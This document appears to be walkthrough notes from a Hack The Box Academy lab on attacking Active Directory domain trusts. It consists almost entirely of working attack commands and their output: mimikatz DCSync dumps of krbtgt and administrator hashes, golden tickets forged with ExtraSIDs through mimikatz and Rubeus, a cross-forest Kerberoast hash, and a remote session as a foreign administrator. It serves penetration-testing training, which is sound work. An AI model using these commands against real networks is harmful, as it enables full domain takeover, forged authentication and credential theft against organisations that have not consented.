# Attacking Domain Trusts from Windows

## Child to Parent (ExtraSIDs Attack)

### KRBTGT Hash (LOGISTICS)

```pwsh
PS C:\Users\htb-student_adm> C:\Tools\mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL" exit
```

```output title="Output" hl_lines="3 20"
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8c6b7919c01a5c654c91922f9a13225c

* Primary:Kerberos-Newer-Keys *
    Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
      aes128_hmac       (4096) : ca289e175c372cebd18083983f88c03e
      des_cbc_md5       (4096) : fee04c3d026d7538

* Primary:Kerberos *
    Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
    Credentials
      des_cbc_md5       : fee04c3d026d7538

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  71fc2147dcf21fed982e180c3ebc48b8
    02  e193e66c97fb2ff16f352c25c06a5009
    03  9b4087c331fcd37671b407cb4f0e44a2
    04  71fc2147dcf21fed982e180c3ebc48b8
    05  e193e66c97fb2ff16f352c25c06a5009
    06  0da90377100224d5635e529d358f1409
    07  71fc2147dcf21fed982e180c3ebc48b8
    08  1763ae4e99694dcf66700106bb303aa5
    09  024c0c0c71f6e1f89a8c3be922534f0d
    10  3523e29569b4a45d20d99b7937f40326
    11  1763ae4e99694dcf66700106bb303aa5
    12  024c0c0c71f6e1f89a8c3be922534f0d
    13  5f47d51dee42d3f9a52a2d464c291fe5
    14  1763ae4e99694dcf66700106bb303aa5
    15  b7196b13a4fc2a29c18de543912039c2
    16  64689c7d74d2f2908330c62e47b34d75
    17  023f316da4715dd596d4ae6d5b9049cc
    18  fec7644b22077323cc9770c91d205269
    19  5cacbc938eaeb1b3a58572dafed92d97
    20  684ef5f716d49e4274a4ceb48d5fd6ba
    21  99968ef6b4c440cbd652ce6718a9ba39
    22  99968ef6b4c440cbd652ce6718a9ba39
    23  fbd2d7aef9329e981cd1bfdef2924843
    24  38653e1cf10018a3ae60fdb681241f1b
    25  5efd3ccfb3589c3bd6d76738ceeffb92
    26  dcd5dfeec024fe725edcaab5953d2011
    27  d92dcf29cd473a6ebae4b3bca1e578a9
    28  ff0382afc6adb89c00d5bf90cd5f4eca
    29  d7d958214c25d0835547320a0f0faf49
```

### SID (LOGISTICS)

```pwsh
PS C:\Users\htb-student_adm> Get-DomainSID
```

```output title="Output"
S-1-5-21-2806153819-209893948-922872689
```

### SID (Enterprise Admins of INLANEFREIGHT)

```pwsh
PS C:\Users\htb-student_adm> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins"
```

```output title="Output" hl_lines="7"
grouptype              : UNIVERSAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Admins
whenchanged            : 3/22/2022 3:28:23 AM
objectsid              : S-1-5-21-3842939050-3880317879-2865463114-519
objectclass            : {top, group}
cn                     : Enterprise Admins
usnchanged             : 3156873
dscorepropagationdata  : {3/24/2022 3:52:59 PM, 3/24/2022 3:49:31 PM, 3/22/2022 3:28:23 AM, 3/22/2022 3:03:18 AM...}
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL, CN=Administrators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL}
description            : Designated administrators of the enterprise
distinguishedname      : CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name                   : Enterprise Admins
member                 : {CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL, CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL}
usncreated             : 12339
whencreated            : 10/27/2021 3:14:34 PM
instancetype           : 4
objectguid             : f134c830-7e17-4ee7-a4d0-7b341dde37ea
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
```

### Golden Ticket

#### Mimikatz

```pwsh
PS C:\Users\htb-student_adm> C:\Tools\mimikatz.exe "kerberos::golden /ptt /user:hacker /krbtgt:9D765B482771505CBE97411065964D5F /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519" exit
```

```output title="Output" hl_lines="1-3 16"
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 5/28/2025 11:49:31 PM ; 5/26/2035 11:49:31 PM ; 5/26/2035 11:49:31 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

#### Rubeus

```pwsh
PS C:\Users\htb-student_adm> C:\Tools\Rubeus.exe golden /ptt /user:hacker /rc4:9D765B482771505CBE97411065964D5F /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519
```

```output title="Output" hl_lines="5-7 58"
[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 5/28/2025 11:59:43 PM
[*] StartTime      : 5/28/2025 11:59:43 PM
[*] EndTime        : 5/29/2025 9:59:43 AM
[*] RenewTill      : 6/4/2025 11:59:43 PM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
```

### Verifying the Ticket

```pwsh
PS C:\Users\htb-student_adm> klist
```

```output title="Output" hl_lines="5-6"
Current LogonId is 0:0x63caf

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 5/28/2025 23:49:31 (local)
        End Time:   5/26/2035 23:49:31 (local)
        Renew Time: 5/26/2035 23:49:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

### DCSync for a Domain Administrator

```pwsh
PS C:\Users\htb-student_adm> C:\Tools\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL" exit
```

```output title="Output" hl_lines="3 20"
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f7a041e79cad40b93848d495cbbb1e3e

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALlab_adm
    Default Iterations : 4096
    Credentials
      des_cbc_md5       (4096) : d643a7d57f7557bc
    OldCredentials
      aes256_hmac       (4096) : 1024df6927217d93d9f08a6988138a0d59bb268e3e67dfd4d88785099b0f5521
      aes128_hmac       (4096) : a2bb3cf123df171ef4352da6f5d9fc5d
      des_cbc_md5       (4096) : 15fe346432e0fb79
    OlderCredentials
      aes256_hmac       (4096) : cb7eee9880b78901d8660b38c2199e4f2c9fce927a73f482b842014fe84db242
      aes128_hmac       (4096) : 5aee33093602e913b78350b78ef669ad
      des_cbc_md5       (4096) : f168c104ce8a2fba

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALlab_adm
    Credentials
      des_cbc_md5       : d643a7d57f7557bc
    OldCredentials
      des_cbc_md5       : 15fe346432e0fb79

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  d834eec39b2e513e62a38f8d8342dde2
    02  4d47757a2b04033ab73235da337a39ef
    03  60ada461ce409084c468695cbbbca7cd
    04  d834eec39b2e513e62a38f8d8342dde2
    05  4d47757a2b04033ab73235da337a39ef
    06  c17815a2c998f16e8effe6b753895983
    07  d834eec39b2e513e62a38f8d8342dde2
    08  d6dafddff809563d4774ed51af364e0f
    09  b4a9a37463e24af5fd328a1d257c2a1d
    10  23280bdd6768e318c0c9e1a0da125a18
    11  d6dafddff809563d4774ed51af364e0f
    12  b4a9a37463e24af5fd328a1d257c2a1d
    13  9c3d64ff00cfe4e2fb45c34af5e824d0
    14  d6dafddff809563d4774ed51af364e0f
    15  18d8624a9d5e36563fded0e339c93883
    16  ed1884d7e0f72ff967e5907d2e5ca2a5
    17  db629e425def46a1238bd001816404c2
    18  8c90914fd461ac922d0a03a6667e0950
    19  2765ac758454fda3a2d4048782c1033e
    20  06184d12f3bfafe1f38c6617454e802d
    21  518404c7eec01bc066ad1c0e3c466b81
    22  518404c7eec01bc066ad1c0e3c466b81
    23  25a2cc716709c03ec1f6c8683d0eda6c
    24  6d1219663890e3b77d07c92cc4d24d0f
    25  25c7ec91a9835ac3a1b4f0196f540f28
    26  6a61f29c7a0473dd7d9d3ca92c04bac6
    27  341ace52a31ac40a507c4ee44c4ddccc
    28  e7b82c83925aae6ef1e1f4bcaa092415
    29  a0bef5738d23235f8e1efd81154cadf9
```

## Cross-Forest (Bidirectional or Inbound Trust)

### SPN

```pwsh
PS C:\Users\htb-student> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -SPN | Select-Object samaccountname
```

```output title="Output" hl_lines="4"
samaccountname
--------------
krbtgt
mssqlsvc
sapsso
```

### Enumeration

```pwsh
PS C:\Users\htb-student> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | Select-Object samaccountname,memberof
```

```output title="Output"
samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

### Kerberoasting

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe kerberoast /user:mssqlsvc /domain:FREIGHTLOGISTICS.LOCAL /nowrap
```

```output title="Output" hl_lines="6"
[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$1C6E4782AFBF682181AE7BD2BB258A81$554C9B6EDF0E2570A03675B80E50447F2B57FA825D4AF0382CC7E6E423E3032FA005EFBBEDD561B91F523973E8A23C4A25D213B4016165408E5A8FF59C52FAFCE80A165F8391B2C54720C799B1EFD9BD213D35521601B12ACDB182B2241C42E89BBE7329F59576F4F40332E27D0097F5BDCE3847B1F8F1AF53FCCE28126CC2F79ED60DCB786E4ADB11F2B4C9E6FE496F9C9B087F26391E7F2E16AA5A001E1851CAEF41CC8A25647A2505A306D6F65DB26D278BB19DCBCBD761A27E218F16FEF6BE405FCD597115A6D948A0FCC973D2B93FDA1F4C6FEC6BE1A9DCD45D270773216121E66D2E09B0BDF545005FDD6244A4628414EFD48C2667812DE0BBE1FF7E265DF64CB612A981FD348FC5B937AF881AD494F64C8A1C47844E1E85DEBEB70E104FDABD1188C340004A81E17F2F572A06EAF0FB18FA137914CE416CF58EC885716715F78E69D1172005792FCA3310CEC704F92BDADCBF9E7A75F2958532A323B38A9C0F0667B39DDC3444292BCBE466FF5306E6CFE8680A59D44B1EBDDC40B60343BFB614D65EBCBBC10474275DDA66C7825F01EF58817A95EED1C3530AEA30D8BCB6F0E37D3367DD2295B4CB29B9875CCD531C6FA7CE594F2F9ADC695EAA18B20826B5983CF54ADBA82B9C87519AFC6B28AA4210AED9B5A8F4E86A45113393BAD9D6C665BDBD691AE4DD9EDE61D5BDFD8E1148DC2A0FE7F90E92FDD39C17FECA58B21FE15264F1B9038E01F87B320BE6A014502D57AB64FA5BAC07E9AB85C211CB4D6CC186AA5148FC6E8F29AF3D6418327B57940F018AECDAF076BA199434A4E14D139A7FD42A3368104C872B9334F4E8375839E46D98F8DE0FC54B713CD44B13B32D315A6D1BB80B9012456ACD2A96456FFF30D8DB7790143AA4429F812747F620706CDA677056C5E79AE237319F365FB9FACA53210F1D7D8054D0B2C9D20CDCFB831FF463E3EE55CCB7D05A7EAA38FBE40F4537DD2875B4E097F9291220966A49FFB1B17453477DAF6171424333521BBEA8C50809A59800F1116CC66EBE6ADC0F621CE5E9ED1160089F9B009518E9C6CC893135CB8415D079F3AFB4A45AA951B9CB00A05B0EE17DBBF91D4D444679A2C1EE02C38BAA3887AE33CB7B3F93139823DE307C98DE53F1B062458D6A4D53641CA80BA94E5C0146FE08C9D86458A9974AC5AC1E72AE9C6A80787222505D2FD78B78A88F67518A61D9ED07DB4CB9C1F44301259262F43A30BFA2D43869BCA2D5850CABE31A99F4143C2B6EF44A8D4C93931EC3C23F83D256D0266D06AAB4C1E1F6D7B1C6D5650F8B70CEF7E6816111D3FDCF48FC96FEF6223F0F28EB4DA9E8F8DDAAD62C6DBE054C5E35A0F1E2C4ECE3F53AC611E419751FD76209A79213CEA7506E223DE2F468AB11671AB978363CBB31A76A3D5C336E52C14531A962D9801668A4C5C4F59BFC7D09419C2456CC60928229B2467DC9F93FDBA6400869AEE40D826BEAF57F41963DFB4EA1CD0CB9D2D2E3D4C9EDEE9E19F282102BBDBAAF95D2B306427387102EB8F17C592EE75E5F5500C8B31F3D5A6F2ADA92CD802259F53A0518CDE07D5BE9E201CB6FB05960D4DF94EBB0F29AEC5E9AED84F382AA9B3F1E61ABD9CC4048750B9CB996376F5461847251885E10DA404D2CEBC2B1185261471B695A896EFFDCE8
```

## Foreign Domain Group Membership

### Discovery

```pwsh
PS C:\Users\htb-student> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

```output title="Output" hl_lines="2 5"
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL
```

### Name

```pwsh
PS C:\Users\htb-student> ConvertFrom-SID S-1-5-21-3842939050-3880317879-2865463114-500
```

```output title="Output"
INLANEFREIGHT\administrator
```

### Authenticating

```pwsh
PS C:\Users\htb-student> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential "INLANEFREIGHT\Administrator"
```
